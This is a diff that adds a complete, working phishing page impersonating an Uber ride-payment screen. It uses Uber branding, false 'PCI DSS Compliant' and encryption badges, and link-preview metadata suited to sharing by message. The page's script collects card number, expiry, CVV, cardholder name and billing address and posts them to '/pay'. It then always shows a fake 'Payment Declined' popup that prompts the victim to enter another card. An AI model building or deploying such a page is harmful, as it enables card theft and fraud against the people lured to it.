@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- iOS/Android App Preview Settings -->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="Uber">
+    <link rel="apple-touch-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 180 180'><rect fill='%23000' width='180' height='180'/><text x='90' y='130' font-size='120' font-weight='bold' fill='white' text-anchor='middle'>U</text></svg>">
+    <meta name="theme-color" content="#000000">
+    <!-- Open Graph / Social Media Preview -->
+    <meta property="og:title" content="Uber - Complete Payment">
+    <meta property="og:description" content="Pay for your Uber ride securely">
+    <meta property="og:image" content="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1200 630'><rect fill='%23F6F6F6' width='1200' height='630'/><rect fill='%23000' x='400' y='150' width='400' height='330' rx='20'/><text x='600' y='360' font-size='180' font-weight='bold' fill='white' text-anchor='middle'>U</text></svg>">
+    <meta property="og:type" content="website">
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Uber - Complete Payment">
+    <meta name="twitter:description" content="Pay for your Uber ride securely">
+    <meta name="twitter:image" content="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1200 630'><rect fill='%23F6F6F6' width='1200' height='630'/><rect fill='%23000' x='400' y='150' width='400' height='330' rx='20'/><text x='600' y='360' font-size='180' font-weight='bold' fill='white' text-anchor='middle'>U</text></svg>">
+    <title>Uber - Complete Payment</title>
+    <style>
+        :root {
+            --uber-black: #000000;
+            --uber-white: #FFFFFF;
+            --uber-grey: #F6F6F6;
+            --uber-border: #EEEEEE;
+            --uber-text-muted: #6B6B6B;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--uber-grey);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: var(--uber-black);
+        }
+        .container {
+            background-color: var(--uber-white);
+            padding: 40px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 440px;
+            box-sizing: border-box;
+        }
+        .header {
+            text-align: left;
+            margin-bottom: 32px;
+        }
+        .logo {
+            margin-bottom: 24px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background-color: #000;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: bold;
+            color: #fff;
+        }
+        .uber-brand {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: -1.5px;
+            color: var(--uber-black);
+            line-height: 1;
+        }
+        h1 {
+            font-size: 22px;
+            font-weight: 600;
+            margin: 0;
+        }
+        .ride-info {
+            border-top: 1px solid var(--uber-border);
+            border-bottom: 1px solid var(--uber-border);
+            padding: 20px 0;
+            margin-bottom: 32px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .ride-name {
+            font-size: 16px;
+            font-weight: 500;
+        }
+        .ride-status {
+            font-size: 14px;
+            color: var(--uber-text-muted);
+            margin-top: 4px;
+        }
+        .ride-cost {
+            font-size: 20px;
+            font-weight: 600;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 8px;
+            font-weight: 400;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            background-color: white;
+            color: black;
+        }
+        input:focus {
+            border-color: var(--uber-black);
+        }
+        .form-row {
+            display: flex;
+            gap: 16px;
+        }
+        .form-row .form-group {
+            flex: 1;
+        }
+        .pay-button {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--uber-black);
+            color: var(--uber-white);
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 12px;
+        }
+        .pay-button:disabled {
+            background-color: #ccc;
+        }
+
+        /* === CUSTOM MODAL STYLING === */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            backdrop-filter: blur(4px);
+        }
+
+        .modal-content {
+            background-color: white;
+            padding: 30px;
+            border-radius: 12px;
+            max-width: 320px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        .modal-header {
+            font-weight: bold;
+            font-size: 18px;
+            margin-bottom: 12px;
+            color: #000;
+        }
+
+        .modal-body {
+            font-size: 15px;
+            color: #444;
+            margin-bottom: 24px;
+            line-height: 1.4;
+        }
+
+        .modal-btn {
+            background-color: black;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .security-strip {
+            margin-top: 32px;
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            border-top: 1px solid var(--uber-border);
+            padding-top: 20px;
+            font-size: 12px;
+            color: var(--uber-text-muted);
+        }
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 12px;
+            color: var(--uber-text-muted);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <div class="logo-icon">U</div>
+                <span class="uber-brand">Uber</span>
+            </div>
+            <h1>Pay for Rylies Trip</h1>
+        </div>
+
+        <div class="ride-info">
+            <div>
+                <div class="ride-name">Your Ride</div>
+                <div class="ride-status">Ready to ride & awaiting driver confirmation.</div>
+            </div>
+            <div class="ride-cost">$8.72</div>
+        </div>
+
+        <form id="payment-form">
+            <div class="form-group">
+                <label for="card-holder">Card Holder Name</label>
+                <input type="text" id="card-holder" placeholder="Full Name as it appears on card" required>
+            </div>
+
+            <div class="form-group">
+                <label for="card-number">Card Number</label>
+                <input type="text" id="card-number" placeholder="1234 5678 1234 5678" maxlength="19" required>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="expiry-date">Expiry (MM/YY)</label>
+                    <input type="text" id="expiry-date" placeholder="MM/YY" maxlength="5" required>
+                </div>
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" placeholder="123" maxlength="4" required>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="billing-address">Billing Address</label>
+                <input type="text" id="billing-address" placeholder="123 Main St, Apt 4B" required>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="billing-city">City</label>
+                    <input type="text" id="billing-city" placeholder="New York" required>
+                </div>
+                <div class="form-group">
+                    <label for="billing-state">State</label>
+                    <input type="text" id="billing-state" placeholder="NY" maxlength="2" required>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="zip-code">Billing Zip Code</label>
+                <input type="text" id="zip-code" placeholder="12345" maxlength="10" required>
+            </div>
+
+            <button type="submit" class="pay-button">AUTHORIZE & PAY $8.72</button>
+        </form>
+
+        <div class="security-strip">
+            <div>🔒 PCI DSS Compliant</div>
+            <div>🛡️ 256-bit Encryption</div>
+        </div>
+
+        <div class="footer">
+            Powered by Uber Payments System. <strong>• Securely Transacted.</strong>
+        </div>
+    </div>
+
+    <!-- Custom Declined Modal -->
+    <div id="declined-modal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">Payment Declined</div>
+            <div class="modal-body">Your transaction was not authorized by the issuing bank. Please try another card.</div>
+            <button class="modal-btn" onclick="closeModal()">Try Another Card</button>
+        </div>
+    </div>
+
+    <script>
+        const cardHolderInput = document.getElementById('card-holder');
+        const cardNumberInput = document.getElementById('card-number');
+        const expiryDateInput = document.getElementById('expiry-date');
+        const cvvInput = document.getElementById('cvv');
+        const addressInput = document.getElementById('billing-address');
+        const cityInput = document.getElementById('billing-city');
+        const stateInput = document.getElementById('billing-state');
+        const zipCodeInput = document.getElementById('zip-code');
+        const form = document.getElementById('payment-form');
+        const payButton = form.querySelector('.pay-button');
+
+        // Format card number with spaces
+        cardNumberInput.addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) formattedValue += ' ';
+                formattedValue += value[i];
+            }
+            e.target.value = formattedValue;
+        });
+
+        // Format expiry date with slash
+        expiryDateInput.addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2);
+            }
+            e.target.value = value.substring(0, 5);
+        });
+
+        // Numeric only for CVV and Zip
+        [cvvInput, zipCodeInput].forEach(input => {
+            input.addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/\D/g, '');
+            });
+        });
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const formData = {
+                cardHolder: cardHolderInput.value,
+                cardNumber: cardNumberInput.value.replace(/\s/g, ''),
+                expiryDate: expiryDateInput.value,
+                cvv: cvvInput.value,
+                address: addressInput.value,
+                city: cityInput.value,
+                state: stateInput.value,
+                zipCode: zipCodeInput.value,
+                amount: "8.72"
+            };
+
+            payButton.innerText = "Processing...";
+            payButton.disabled = true;
+
+            try {
+                const response = await fetch('/pay', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(formData),
+                });
+
+                setTimeout(() => {
+                    document.getElementById('declined-modal').style.display = 'flex';
+                }, 1500);
+
+            } catch (error) {
+                alert("❌ SYSTEM ERROR\nPlease try again later.");
+                payButton.innerText = "AUTHORIZE & PAY $8.72";
+                payButton.disabled = false;
+            }
+        });
+
+        function closeModal() {
+            document.getElementById('declined-modal').style.display = 'none';
+            payButton.innerText = "AUTHORIZE & PAY $8.72";
+            payButton.disabled = false;
+        }
+    </script>
+</body>
+</html>
